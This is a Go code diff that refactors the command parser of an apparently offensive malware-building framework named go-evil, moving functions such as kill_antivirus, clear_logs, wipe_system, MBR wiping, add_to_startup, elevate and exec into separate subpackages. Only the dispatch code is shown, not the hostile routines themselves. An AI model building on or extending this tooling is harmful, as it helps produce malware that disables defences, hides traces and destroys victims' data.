@@ -3,8 +3,14 @@ package system
 import (
 	"fmt"
 
+	"github.com/TeamPhoneix/go-evil/domains/system/antivirus"
+	"github.com/TeamPhoneix/go-evil/domains/system/directories"
+	"github.com/TeamPhoneix/go-evil/domains/system/disks"
 	"github.com/TeamPhoneix/go-evil/domains/system/io"
+	"github.com/TeamPhoneix/go-evil/domains/system/logs"
 	"github.com/TeamPhoneix/go-evil/domains/system/processes"
+	"github.com/TeamPhoneix/go-evil/domains/system/startup"
+	"github.com/TeamPhoneix/go-evil/domains/system/stop"
 	systemcommands "github.com/TeamPhoneix/go-evil/domains/system/system_commands"
 	"github.com/TeamPhoneix/go-evil/domains/system/users"
 	"github.com/TeamPhoneix/go-evil/domains/system/wipe"
@@ -26,13 +32,13 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 		call, s_json = io.Input(s_json)
 
 	case "exit":
-		call, s_json = Exit(s_json, value)
+		call, s_json = stop.Exit(s_json, value)
 
 	case "exec":
-		call, s_json = Exec(s_json, value)
+		call, s_json = systemcommands.Exec(s_json, value)
 
 	case "abort":
-		call, s_json = Abort(s_json, value)
+		call, s_json = stop.Abort(s_json, value)
 
 	case "reboot":
 		call, s_json = systemcommands.Reboot(s_json)
@@ -41,10 +47,10 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 		call, s_json = systemcommands.Shutdown(s_json)
 
 	case "add_to_startup":
-		call, s_json = Add_to_startup(s_json)
+		call, s_json = startup.Add(s_json)
 
 	case "list_dir":
-		call, s_json = list_dir(s_json, value)
+		call, s_json = directories.List(s_json, value)
 
 	case "write":
 		call, s_json = io.Write(s_json, value)
@@ -62,7 +68,7 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 		call, s_json = io.Copy(value, s_json)
 
 	case "change_background":
-		call, s_json = change_background(value, s_json)
+		call, s_json = systemcommands.Change_background(value, s_json)
 
 	case "elevate":
 		call, s_json = systemcommands.Elevate(value, s_json)
@@ -77,10 +83,10 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 		call, s_json = processes.Kill_name(value, s_json)
 
 	case "kill_antivirus":
-		call, s_json = kill_antivirus(value, s_json)
+		call, s_json = antivirus.Kill(value, s_json)
 
 	case "clear_logs":
-		call, s_json = clear_logs(value, s_json)
+		call, s_json = logs.Clear(value, s_json)
 
 	case "wipe_system":
 		call, s_json = wipe.System(value, s_json)
@@ -89,7 +95,7 @@ func Parser(function string, value string, s_json string) ([]string, string) {
 		call, s_json = wipe.Mbr(value, s_json)
 
 	case "get_disks":
-		call, s_json = get_disks(value, s_json)
+		call, s_json = disks.Get(value, s_json)
 
 	case "get_users":
 		call, s_json = users.Get(value, s_json)
